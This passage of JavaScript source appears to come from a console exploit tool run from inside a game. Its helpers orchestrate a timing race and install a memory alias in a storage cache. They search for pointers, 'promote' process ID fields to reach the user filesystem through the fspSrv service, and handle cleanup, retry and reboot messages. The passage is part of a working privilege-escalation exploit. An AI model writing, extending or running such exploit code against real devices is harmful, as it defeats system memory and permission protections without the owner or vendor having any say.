        rootClones: handles.rootClones,
        rootSession: handles.rootSession,
        saveClones: handles.saveClones,
        savedHandle: handles.savedHandle,
        storageHandle: handles.storageHandle,
        temporaryHandle: 0,
        triggerHandle: handles.triggerHandle,
        workerStateSafe: retired.workerStateSafe,
        dirtyFileSize: config.DIRTY_FILE_SIZE,
        dirtyFilePath: ctx.scratch.dirtyFilePath
    });

    await verboseLog(formatCleanupResult(cleanup, retired.workerStateSafe));
    recordCleanupState(attemptState, {retired, cleanup},
                       retired.workerStateSafe,
                       Boolean(retired.addressCopy?.candidateCacheNeedsRetirement));
}

// ----- Stop-and-cleanup orchestration -----

/**
 * The guarded cleanup every failure path runs through. It retires the candidate
 * cache while a handle is still open, deletes `save:/hole`, closes the remaining
 * handles, and records the verdict on the attempt.
 */
async function stopWithCleanup(ctx, {
    reason,
    addressCopy = null,
    candidateCacheNeedsRetirement = false,
    workerStateSafe = true,
    domainSession = null
}) {
    const {attemptState, config, helpers, handles, scratch} = ctx;

    ctx.cleanupAttempted = true;
    await beginCleanupLog(attemptState);

    /*
     * A worker may still hold its buffers when cleanup throws, so the allocation
     * scope stays alive until the guarded fallback cleanup has finished.
     */
    attemptState.workersQuiesced = false;

    await verboseLog("Stopping reason: " + reason);

    const requestedAddressCopy = addressCopy || ctx.addressCopy;
    const retirementRequested = candidateCacheNeedsRetirement ||
        attemptState.candidateCacheRetirementRequired;

    let retired = {
        addressCopy: requestedAddressCopy,
        candidateHandle: handles?.candidateHandle || 0,
        candidateCacheRetired: Boolean(requestedAddressCopy?.candidateCacheRetired),
        workerStateSafe: Boolean(workerStateSafe),
        workersQuiesced: Boolean(workerStateSafe)
    };

    if (retired.candidateHandle) {
        retired = await retireCandidateCacheAndClose({
            helpers, addressCopy: requestedAddressCopy,
            candidateCacheNeedsRetirement: retirementRequested ||
                Boolean(requestedAddressCopy?.candidateCacheNeedsRetirement),
            candidateHandle: retired.candidateHandle,
            rootSession: handles?.rootSession || 0,
            retireRetainedEndpoint: null,
            workerStateSafe: Boolean(workerStateSafe)
        });
        await verboseLog(formatRetirementResult(retired));
    }

    const finalAddressCopy = retired.addressCopy || requestedAddressCopy || {};
    const finalWorkerStateSafe = Boolean(retired.workerStateSafe ?? workerStateSafe);

    const cleanup = await cleanupScratchAndHandles({
        SCRATCH_DIR: scratch?.SCRATCH_DIR,
        auxiliaryStorageHandle: handles?.auxiliaryStorageHandle || 0,
        candidateCacheNeedsRetirement: retirementRequested ||
            Boolean(finalAddressCopy.candidateCacheNeedsRetirement),
        candidateCacheRetired: Boolean(retired.candidateCacheRetired ||
            finalAddressCopy.candidateCacheRetired),
        retainedEndpointActive: Boolean(finalAddressCopy.retainedEndpointActive),
        domainSession: domainSession || handles?.domainSession || null,
        extentTriggerHandle: handles?.extentTriggerHandle || 0,
        extraStorages: handles?.extraStorages || [],
        pinHandle: handles?.pinHandle || 0,
        rootClones: handles?.rootClones || [],
        rootSession: handles?.rootSession || 0,
        saveClones: handles?.saveClones || [],
        savedHandle: handles?.savedHandle || 0,
        storageHandle: handles?.storageHandle || 0,
        temporaryHandle: getTemporaryHandleForCleanup(handles),
        triggerHandle: handles?.triggerHandle || 0,
        workerStateSafe: finalWorkerStateSafe,
        dirtyFileSize: config.DIRTY_FILE_SIZE,
        dirtyFilePath: scratch?.dirtyFilePath || ""
    });

    await verboseLog(formatCleanupResult(cleanup, finalWorkerStateSafe));
    recordCleanupState(attemptState, {retired, cleanup}, workerStateSafe,
                       Boolean(retirementRequested ||
            addressCopy?.candidateCacheNeedsRetirement));
}

// ----- Pipeline state helpers -----

/**
 * Everything a single attempt builds, named once. `handles` is filled in place
 * instead of being rebuilt with a spread, so every phase sees the same object.
 */
function createAttemptContext({attemptState, config, helpers, runControl}) {
    return {
        address: null,
        addressCopy: null,
        alias: null,
        attemptState,
        buffers: null,
        canary: null,
        candidate: null,
        cleanupAttempted: false,
        config,
        handles: {},
        heapBaseline: null,
        helpers,
        packets: null,
        pktBuf: 0,
        promotion: null,
        rawScheduling: null,
        release: null,
        renamePathBuffers: null,
        runControl,
        scratch: null,
        waves: null,
        workerStateSafe: true
    };
}

/** Apply the delays the previous attempt tuned, in place, so every phase keeps reading the same config object. */
function applyTimingSchedule(config, timingSchedule) {
    if (!hasMatchingTimingSchedule(config, timingSchedule)) {
        return config;
    }

    config.roleDelays.splice(0, config.roleDelays.length,
                             ...timingSchedule.roleDelays);
    config.guardDelays.splice(0, config.guardDelays.length,
                              ...timingSchedule.guardDelays);
    return config;
}

function hasMatchingTimingSchedule(config, timingSchedule) {
    return Boolean(timingSchedule &&
        timingSchedule.roleDelays?.length === config.roleDelays.length &&
        timingSchedule.guardDelays?.length === config.guardDelays.length);
}

async function logHeapBaseline(heapBaseline) {
    let counter5 = "unavailable";
    let counters = "unavailable";

    if (heapBaseline) {
        counter5 = heapBaseline[5].toString(16);
        counters = heapBaseline.map(value => value.toString(16)).join(",");
    }

    await log("Heap baseline: counter5=0x" + counter5);
    await verboseLog("Heap baseline counters: " + counters);
}

function applyCanaryAttemptState(attemptState, canary) {
    const patch = canary.attemptStatePatch;

    attemptState.stoppedByUser = patch.stoppedByUser;
    attemptState.positiveAttempts = patch.positiveAttempts;
    attemptState.positiveWindows = patch.positiveWindows;
    attemptState.qualifiedCanaryFlips = patch.qualifiedCanaryFlips;

    if (patch.timingAdjustment) {
        attemptState.timingAdjustment = patch.timingAdjustment;
        attemptState.nextTimingSchedule = patch.nextTimingSchedule;
    }
}

/** Name the candidate storage verdict in one place, so callers stop repeating the same three branches. */
function createCandidateStorageMessage(candidate) {
    if (!candidate?.candidateHandle || !candidate?.primeHex) {
        return "Candidate storage is unavailable.";
    }

    if (candidate.failureReason) {
        return "Candidate storage verification failed.";
    }

    return "CANDIDATE STORAGE IS READY";
}

/** Resources the address scan reads back, gathered once and passed to both the copy and the analysis bags. */
function buildAnalysisResources(ctx) {
    const {config, canary, handles, packets, scratch, waves} = ctx;

    return {
        config, REQ: packets.REQ,
        clearPkt: packets.clearPkt,
        clearSendIndex: waves.clearSendIndex,
        gates: waves.gates,
        pinFirstWaveQualified: canary.control.pinFirstWaveQualified,
        pinHandle: canary.control.pinHandle, pinPkt: packets.pinPkt,
        pinSendIndex: waves.pinSendIndex,
        pktBuf: ctx.pktBuf, prePkt: packets.prePkt,
        preSendIndex: waves.preSendIndex,
        rootSession: handles.rootSession,
        sendIndices: waves.sendIndices,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        savedHandle: handles.savedHandle,
        setupPath: scratch.setupPath, setupPkt: scratch.setupPkt
    };
}

/** Everything the copy waves need, plus the fields the address phases read later. */
function buildAddressCopy(ctx) {
    const {config, canary, handles, packets, scratch, waves} = ctx;
    const {candidate} = ctx;

    return stampAliasResults({
        config, REQ: packets.REQ,
        dirtyFilePath: scratch.dirtyFilePath,
        dirtyWriteBuf: canary.control.dirtyWriteBuf,
        dirtyWritePkt: canary.control.dirtyWritePkt,
        gates: waves.gates, pinPkt: packets.pinPkt,
        pktBuf: ctx.pktBuf, rawScheduling: ctx.rawScheduling,
        rootSession: handles.rootSession,
        savedHandle: handles.savedHandle,
        sendIndices: waves.sendIndices,
        triggerHandle: handles.triggerHandle,
        waveData: waves.waveData,
        waveExtra: waves.waveExtra,
        workerResources: waves.workerResources,
        fragmentBufs: ctx.buffers.fragmentBufs,
        triggerBuf: ctx.buffers.triggerBuf,
        aliasControlHex: candidate.aliasControlHex,
        primeHex: candidate.primeHex,
        analysis: buildAnalysisResources(ctx)
    }, ctx.alias);
}

/**
 * Stamp the copy results into the bag the later phases read. Those fields start
 * empty because the bag is built before the copy waves run.
 */
function stampAliasResults(copy, alias) {
    copy.candidateCacheNeedsRetirement = Boolean(alias?.candidateCacheNeedsRetirement);
    copy.copyWavesTotal = alias?.copyWavesTotal || 0;
    copy.wavesJoined = alias?.wavesJoined || 0;
    copy.wavesStarted = alias?.wavesStarted || 0;
    copy.workerStateSafe = alias?.workerStateSafe === true;
    return copy;
}

/** Compare the heap counter against the attempt baseline. When it moves, the alias almost certainly landed. */
async function logHeapStateBeforeAlias(ctx) {
    const counters = readAllocationCounters(ctx.handles.rootSession, ctx.pktBuf);
    const counter5 = counters ? counters[5] : null;

    let delta = null;

    if (counter5 !== null && ctx.heapBaseline) {
        delta = counter5 - ctx.heapBaseline[5];
    }

    await log("Heap before memory alias: counter5=" + formatHeapCounter(counter5) +
        "; delta-vs-attempt-start=" + formatHeapDelta(delta));
}

function formatHeapCounter(counter) {
    if (counter === null) {
        return "unavailable";
    }

    return "0x" + counter.toString(16);
}

function formatHeapDelta(delta) {
    if (delta === null) {
        return "unavailable";
    }

    if (delta < 0) {
        return "-0x" + (-delta).toString(16);
    }

    return "+0x" + delta.toString(16);
}

/**
 * Read the alias back through the candidate storage. A copy that reported
 * success but still reads back "original" is the one case worth retrying, and it
 * is what the reservation-first allocation order exists for.
 */
async function confirmAliasReadback(ctx, alias) {
    if (!alias?.aliasInstalled) {
        return true;
    }

    const readback = ctx.helpers.inspectCandidateCacheAlias(ctx.handles.candidateHandle, {
        config: ctx.config,
        aliasControlHex: ctx.candidate.aliasControlHex,
        primeHex: ctx.candidate.primeHex
    });

    await verboseLog(formatAliasReadbackDetails(readback));

    if (readback.state === "aliased") {
        return true;
    }

    await log("Cache alias readback is " + readback.state + "; memory search is skipped.");

    if (readback.state === "original" && !ctx.attemptState.usePreReservation) {
        ctx.attemptState.retryWithPreReservation = true;
    }

    await stopWithCleanup(ctx, {
        reason: "Cache copy waves completed, but candidate readback did not confirm the alias.",
        candidateCacheNeedsRetirement:
            Boolean(alias?.candidateCacheNeedsRetirement),
        workerStateSafe: alias?.workerStateSafe === true
    });
    return false;
}

function formatReleaseSetupDetails(releaseSetup) {
    return releaseSetup.extraStorages.length + "/" +
        releaseSetup.expectedStorages + " storages prepared (attempted=" +
        releaseSetup.attemptedStorages + "; stopped=" +
        (releaseSetup.failureReason || "no") + ").";
}

function formatBaselineFailureDetails(baseline) {
    return "Snapshot details: read=" + formatCode(baseline?.readError) +
        "; prefixMatched=" + Boolean(baseline?.prefixMatches) +
        "; dataBytes=" + (baseline?.prevEnd || 0) + ").";
}

async function logPointerSearchVerdict(release) {
    if (!release?.ok) {
        await log("Memory search failed.");
        await verboseLog("Memory search stopped: " +
            (release?.stopReason || "unknown") + ".");
        return;
    }

    if (release.stopReason === "baseline-not-qualified") {
        await log("Memory search skipped because the snapshot was not verified.");
        return;
    }

    if (!release.pointerCandidates.length) {
        await log("No memory candidates were found.");
        await verboseLog(formatMemorySearchDetails(release));
        return;
    }

    await log("Memory candidates found.");
    await verboseLog(formatMemoryCandidateSummary(release));
}

/** Every field the promotion step reads has to be present and already proven. */
function hasVerifiedAddressPlan(address) {
    return Boolean(address?.ok &&
        address.addressReadVerified &&
        address.rootStageVerified &&
        address.verifiedIdentityTargets &&
        address.addressPlan &&
        address.domainSession);
}

function createAddressFailureMessage(address) {
    let reason = "required checks did not pass";

    if (address?.addressFailureReason) {
        reason = address.addressFailureReason.replace(/-/g, " ");
    }

    let detailText = "";

    if (typeof address?.addressFailureDetail === "string") {
        detailText = "; detail=" + address.addressFailureDetail.slice(0, 160);
    }

    return "Memory address not ready for promotion: " + reason +
        "; missing=" + listMissingAddressChecks(address).join(", ") +
        detailText + ".";
}

function listMissingAddressChecks(address) {
    const missingChecks = [];

    if (!address?.ok) {
        missingChecks.push("qualification result");
    }

    if (!address?.addressReadVerified) {
        missingChecks.push("address read");
    }

    if (!address?.rootStageVerified) {
        missingChecks.push("root identity");
    }

    if (!address?.verifiedIdentityTargets) {
        missingChecks.push("identity targets");
    }

    if (!address?.addressPlan) {
        missingChecks.push("address plan");
    }

    if (!address?.domainSession) {
        missingChecks.push("domain session");
    }

    return missingChecks;
}

function recordPromotionOutcome(attemptState, promotion) {
    const outcome = promotion?.promotionOutcome || {};

    attemptState.permissionProven = Boolean(promotion?.promotionAttempted &&
        outcome.promoted === true &&
        outcome.openedUserFs === true &&
        outcome.listedUserRoot === true &&
        outcome.listTransport === 0 &&
        outcome.listResult === 0);
    attemptState.pidPromotionVerified = outcome.promoted === true;
    attemptState.promotionTestHandlesClosed = Boolean(outcome.contentFsHandleClosed !== false &&
        outcome.contentFsDomainObjectClosed !== false);
    attemptState.promotionRestored = promotion?.promotionRestored === true;
}

function createPermissionMessage(permissionProven) {
    if (permissionProven) {
        return "USER STORAGE ACCESS VERIFIED";
    }

    return "User storage access was not verified.";
}

// ----- Attempt support helpers -----

/** Initialize the result object that payload execution, cleanup and the retry policy all read. */
function createAttemptState(usePreReservation) {
    return {
        usePreReservation: usePreReservation === true,
        preReservationTested: false,
        retryWithPreReservation: false,
        permissionProven: false,
        stoppedByUser: false,
        qualifiedCanaryFlips: 0,
        pidPromotionVerified: false,
        positiveAttempts: 0,
        positiveWindows: 0,
        promotionRestored: false,
        cleanupVerified: false,
        workerStateSafe: true,
        workersQuiesced: true,
        safeToRetry: false,
        memoryCleanupVerified: false,
        nativeMemory: null,
        promotionRetained: false,
        lightCleanupVerified: false,
        holeCleanupHandle: 0,
        holeAbsentVerified: false,
        holeCleanupVerified: false,
        primaryCleanupAttempted: false,
        primaryCommitVerified: false,
        primaryScratchCleanupVerified: false,
        primaryHandlesClosed: false,
        endpointRetirementVerified: false,
        cacheRetirementVerified: true,
        candidateCacheRetirementRequired: false,
        retainedEndpointActive: false,
        cleanupLogStarted: false,
        timingAdjustment: null,
        nextTimingSchedule: null
    };
}

/**
 * Release the tracked buffers only once the workers have stopped and no retained
 * endpoint can still read them. A failed handle close or a failed scratch cleanup
 * does not mean the buffers are still in use.
 */
function releaseTrackedAttemptMemory(attemptState, tracker, trackingEnded) {
    let nativeMemory = {ok: false, attempted: tracker.length,
        callsCompleted: 0, errors: [], skipped: true};

    if (!attemptState.promotionRetained &&
        !attemptState.retainedEndpointActive &&
        attemptState.workersQuiesced && trackingEnded) {
        try {
            nativeMemory = {...freeTrackedAllocations(tracker), skipped: false};
        } catch (error) {
            nativeMemory = {ok: false, attempted: tracker.length,
                callsCompleted: 0, errors: [String(error)], skipped: false};
        }
    }

    attemptState.nativeMemory = nativeMemory;
    attemptState.memoryCleanupVerified = Boolean(trackingEnded && nativeMemory.ok);
    return nativeMemory;
}

function canSafelyRetryAttempt(attemptState, trackingEnded, nativeMemory) {
    return Boolean(!attemptState.promotionRetained &&
        !attemptState.pidPromotionVerified &&
        !attemptState.retainedEndpointActive &&
        attemptState.cacheRetirementVerified &&
        attemptState.workerStateSafe && attemptState.workersQuiesced &&
        attemptState.holeAbsentVerified && trackingEnded && nativeMemory.ok);
}

async function logSafeRestartStatus(result) {
    if (!result?.safeToRetry) {
        return;
    }

    await log("STATE IS SAFE TO RESTART - Relaunch the game normally; no hard reboot needed.");
}

function formatCanaryFlipSummary(qualifiedFlips, positiveWaves) {
    // Control waves never count here: only flips that clear every canary gate do.
    if (!positiveWaves) {
        return "CANARY FLIP SUMMARY: flips=0 non-flips=0 rate=n/a (no positive waves).";
    }

    const nonFlips = positiveWaves - qualifiedFlips;
    const rate = (100 * qualifiedFlips / positiveWaves).toFixed(1);
    return "CANARY FLIP SUMMARY: flips=" + qualifiedFlips + " non-flips=" + nonFlips + " rate=" + rate + "% (" +
        qualifiedFlips + "/" + positiveWaves + " positive waves).";
}

async function beginCleanupLog(attemptState) {
    if (attemptState.cleanupLogStarted) {
        return;
    }

    attemptState.cleanupLogStarted = true;
    await log("Cleaning up...");
}

/** Forward the short progress lines the address phase asks for, and nothing else. */
function reportAddressProgress(message) {
    if (typeof message !== "string") {
        return Promise.resolve();
    }

    const concisePrefix = "ADDRESS_SCAN:";

    if (message.startsWith(concisePrefix)) {
        return log(message.slice(concisePrefix.length).trim());
    }

    if (message.startsWith("FSP root capture and scan in progress:")) {
        return log("FSP root identity scan is halfway complete.");
    }

    return Promise.resolve();
}

/**
 * Fold the retirement and cleanup results into the attempt verdict. A negative
 * field means "not proven", which is why every check below stays strict.
 */
function recordCleanupState(attemptState, result, workerStateSafe,
                            candidateCacheNeedsRetirement) {
    const retired = result?.retired;
    const cleanup = result?.cleanup;

    const retirementVerified = Boolean(retired && retired.ok !== false &&
        !retired.failureReason && retired.candidateHandle === 0 &&
        (!candidateCacheNeedsRetirement || retired.candidateCacheRetired ||
            retired.addressCopy?.candidateCacheRetired));
    candidateCacheNeedsRetirement = Boolean(candidateCacheNeedsRetirement ||
        attemptState.candidateCacheRetirementRequired);
    const cacheRetirementVerified = Boolean(!candidateCacheNeedsRetirement ||
        retired?.candidateCacheRetired ||
        retired?.addressCopy?.candidateCacheRetired);

    attemptState.primaryCleanupAttempted = cleanup?.attempted === true;
    attemptState.primaryCommitVerified =
        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
    attemptState.primaryScratchCleanupVerified =
        cleanup?.attempted === true &&
        cleanup?.deleteTransport === 0 && cleanup?.deleteResult === 0 &&
        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
    attemptState.primaryHandlesClosed = Boolean(cleanup?.attempted === true &&
        cleanup.handlesClosed === cleanup.expectedHandles &&
        (cleanup.closeErrors || []).length === 0);
    attemptState.endpointRetirementVerified = retirementVerified;
    attemptState.cacheRetirementVerified = cacheRetirementVerified;
    attemptState.candidateCacheRetirementRequired =
        candidateCacheNeedsRetirement;
    attemptState.retainedEndpointActive = Boolean(retired?.addressCopy?.retainedEndpointActive);
    attemptState.workersQuiesced = Boolean(retired?.workersQuiesced ?? workerStateSafe);

    attemptState.workerStateSafe = Boolean(workerStateSafe === true &&
        retired?.workerStateSafe === true &&
        cleanup?.workerStateSafe === true);
    attemptState.cleanupVerified = Boolean(retirementVerified &&
        cleanup?.cleanupVerified === true && attemptState.workerStateSafe);

    attemptState.safeToRetry = false;
}

/** A restart is safe only when no retained endpoint still reaches the cache and the run failed cleanly. */
function isSafeToRestartAfterFailure(attemptState, executionError) {
    return !attemptState.retainedEndpointActive &&
        attemptState.cacheRetirementVerified &&
        attemptState.workerStateSafe &&
        attemptState.workersQuiesced && !executionError;
}

function formatRetryLimitSummary(attempt, runTotals) {
    let rate = null;

    if (runTotals.positiveAttempts > 0) {
        rate = runTotals.positiveWindows / runTotals.positiveAttempts;
    }

    let windowSummary;

    if (runTotals.positiveAttempts > 0) {
        windowSummary = "Qualified windows: " + runTotals.positiveWindows + "/" +
            runTotals.positiveAttempts + " (" +
            (rate * 100).toFixed(0) + "%).";
    } else {
        windowSummary = "No positive waves ran.";
    }

    let restartHint = "";

    if (rate !== null && rate >= WINDOW_RATE_THRESHOLD) {
        restartHint = " Restart the game before another run.";
    }

    return "Stopped after " + attempt +
        " attempts; user storage access was not verified.\n" +
        windowSummary + restartHint;
}

function createAttemptStatusMessage(attemptState, executionError, trackingEnded) {
    if (attemptState.promotionRetained) {
        const cleanupComplete = attemptState.lightCleanupVerified &&
            attemptState.holeCleanupVerified && trackingEnded;

        if (cleanupComplete) {
            return "Temporary handles closed.\nfspSrv and candidate storage remain open.";
        }

        return "Cleanup incomplete.\nfspSrv and candidate storage remain open.";
    }

    if (attemptState.pidPromotionVerified) {
        const cleanupComplete = attemptState.cleanupVerified &&
            attemptState.holeCleanupVerified && trackingEnded &&
            attemptState.promotionTestHandlesClosed;

        if (cleanupComplete) {
            return "Promotion complete; temporary handles closed.\nPID fields remain promoted.";
        }

        return "Promotion complete, but cleanup incomplete.\nPID fields remain promoted.";
    }

    if (attemptState.safeToRetry) {
        return "STATE IS SAFE - continuing.";
    }

    if (isSafeToRestartAfterFailure(attemptState, executionError)) {

        /*
         * A clean cache entry avoids the dirty-flush hazard, but it says nothing
         * about visibility. Only a read through a fresh storage handle shows that
         * later callers no longer see the alias.
         */
        return "STATE IS SAFE TO RESTART - Relaunch the game normally; no hard reboot needed.";
    }

    if (attemptState.retainedEndpointActive &&
        !attemptState.cacheRetirementVerified) {
        return null;
    }

    /*
     * No safe verdict covers this state. The explicit unknown-state instruction
     * stays, so the user always gets a recovery action to follow.
     */
    return "STATE IS UNKNOWN - hard reboot now (hold Power for 15 seconds).";
}

// ----- Attempt message formatting -----

function formatAliasReadbackDetails(aliasReadback) {
    let message = "Cache alias readback=" + aliasReadback.state;

    if (aliasReadback.readbackHex) {
        message += " · bytes=" + aliasReadback.readbackHex;
    }

    if (aliasReadback.detail) {
        message += " · " + aliasReadback.detail;
    }

    return message;
}

function formatMemoryCandidateSummary(release) {
    return release.pointerCandidates.length + " candidates found across " +
        release.releaseRounds + " rounds" +
        formatMonitoringRoundSuffix(release.monitoringRounds) +
        " (changed links=" + release.totalChangedLinks + ").";
}

function formatMemorySearchDetails(release) {
    let readError = "none";

    if (release.readError != null) {
        readError = formatCode(release.readError);
    }

    return "Memory search details: rounds=" + release.releaseRounds +
        formatMonitoringRoundSuffix(release.monitoringRounds) +
        "; changed links=" + release.totalChangedLinks +
        "; stopped=" + (release.stopReason || "no") +
        "; read error=" + readError + ".";
}

function formatMonitoringRoundSuffix(monitoringRounds) {
    if (!monitoringRounds) {
        return "";
    }

    return " + " + monitoringRounds + " monitor";
}

function getTemporaryHandleForCleanup(handles) {
    if (handles?.preserveTemporaryHandleForCleanup) {
        return 0;
    }

    return handles?.temporaryHandle || 0;
}

function queueVerbosityMessage(runControl, message) {
    runControl.verbosityLogPromise = runControl.verbosityLogPromise
        .then(() => log(message))
        .catch(() => {});
}

function isCandidateStorageSetupUnqualified(candidateSetup) {
    return !candidateSetup?.ok || candidateSetup.canaryQualified !== true ||
        !candidateSetup.candidateHandle || !candidateSetup.primeHex ||
        candidateSetup.failureReason;
}
